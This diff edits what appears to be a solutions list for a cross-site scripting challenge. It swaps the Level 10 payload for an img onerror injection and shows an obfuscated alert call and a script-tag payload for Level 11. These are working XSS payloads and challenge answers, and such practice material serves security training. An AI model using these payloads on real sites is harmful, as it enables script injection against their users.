@@ -72,9 +72,8 @@ this[8680439..toString(30)](document.domain)
 ```
 - Level 10 🧪
 ```
-';print();'
+<body><img src=x onerror=print()></body>
 ```
-
 - Level 11 🧪
 ```
 #<script>alert(document.domain)</script>
